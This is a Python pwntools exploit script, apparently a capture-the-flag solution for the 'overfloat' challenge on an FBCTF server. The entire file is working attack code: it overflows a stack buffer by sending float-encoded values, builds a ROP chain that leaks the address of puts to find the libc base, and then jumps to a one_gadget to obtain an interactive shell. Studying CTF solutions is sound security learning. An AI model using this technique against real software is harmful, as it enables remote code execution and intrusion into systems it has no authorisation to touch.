from pwn import *
import struct
def defloat(num):
    return str(struct.unpack('f', p32(num))[0])
def one(num):
    return str(struct.unpack('f', num)[0])
#p = process('./overfloat')
p = remote( 'challenges.fbctf.com' ,1341)
raw_input('#')
pop_rdi_ret = 0x0400a83
pop_rsi_r15_ret = 0x400a81
leave_ret = 0x400991
puts_plt = 0x400690
puts_got = 0x602020
fgets_plt = 0x400700
main = 0x400993
ropchain = ''
junk = defloat(0xdeadbeef)
#print str(junk)
p.recvuntil('?')
for i in range(0,14):
    p.recvuntil(': ')
    p.sendline(junk)
p.sendline(defloat(pop_rdi_ret))
p.sendline(defloat(0))
p.sendline(defloat(puts_got))
p.sendline(defloat(0))
p.sendline(defloat(puts_plt))
p.sendline(defloat(0))
p.sendline(defloat(main))
p.sendline(defloat(0))
raw_input('#')
p.sendline('done')
p.recvuntil('BON VOYAGE!\n',drop=True)
leak_libc =  p.recvuntil('\n',drop=True)
libc_base = u64(leak_libc.ljust(8,'\x00')) - 0x809c0
print hex(libc_base)
one_gadget = libc_base + 0x4f2c5
one1 = p64(one_gadget)[4:8]
one2 = p64(one_gadget)[0:4]
p.recvuntil('?')
for i in range(0,14):
    p.recvuntil(': ')
    p.sendline(junk)
p.sendline(one(one2))
p.sendline(one(one1))
p.sendline('done')
p.interactive()
